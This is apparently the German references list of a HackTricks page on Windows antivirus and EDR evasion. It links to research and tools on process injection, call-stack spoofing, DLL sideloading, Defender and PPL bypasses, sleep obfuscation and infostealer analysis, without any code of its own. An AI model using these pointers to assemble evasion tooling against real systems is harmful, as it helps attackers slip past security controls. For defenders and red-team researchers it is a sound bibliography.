- [1] [Fortgeschrittene Evasion-Techniken: präzises Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – Blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Aufrufstapel: keine Freifahrtscheine mehr für Malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – Dokumentation](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – Beispiel](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – Beispiel](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC zum Spoofing von Aufrufstapeln](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Neue Infektionskette und ConfuserEx-basierte Verschleierung für DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Sollten Sie Ihrem Zero Trust vertrauen? Umgehung von Zscaler-Posture-Checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Vor ToolShell: Einblicke in die früheren Ransomware-Operationen von Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Missbrauch weitergeleiteter Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar weitergeleiteter Exports in Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Suchreihenfolge für Dynamic-Link Libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Prozesssicherheit und Zugriffsrechte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-Referenz (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-Launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – EDRs mit Unterstützung von Protected Process Light (PPL) abwehren](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Die Schutzschicht von Windows Defender mit der Folder-Redirect-Technik durchbrechen](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenz zum Befehl mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Hinter dem reinen Vorhang: Vom RAT über den Builder zum Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kommt in die Stadt: Ein neuer, ambitionierter Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Entschlüsselung der Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Node.js-Malware mit API-Tracing abwehren](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Dornröschen: Adaptix mit Crystal Palace zur Ruhe legen](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Manipulation von Prozessparametern](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Dornröschen II: CFG, CET und Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko-Sleep-Verschleierung](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Dotnet-ETW verbergen](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Missbrauch von Chrome Remote Desktop bei Red-Team-Operationen: Ein praktischer Leitfaden](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: Defenders Remediation Driver als Kernel-Operationsprimitive einsetzen](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Begleitcode zu MDSecs Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: Selbstmaskierende Funktionen mit LLVM erstellen](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – InjectSetConsole-Quellcode](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – CreatePipe-Funktion](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Erstellen eines untergeordneten Prozesses mit umgeleiteter Ein- und Ausgabe](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian – GhostPack Necromancy: C#-Tools mit WasmForge neu schmieden](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge – C#-/.NET-Projekte kompilieren](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty-Proof-of-Concept und Quellcode](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Thread-Pool-Interna für shellcodeless DLL injection missbrauchen](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
{{#include ../banners/hacktricks-training.md}}
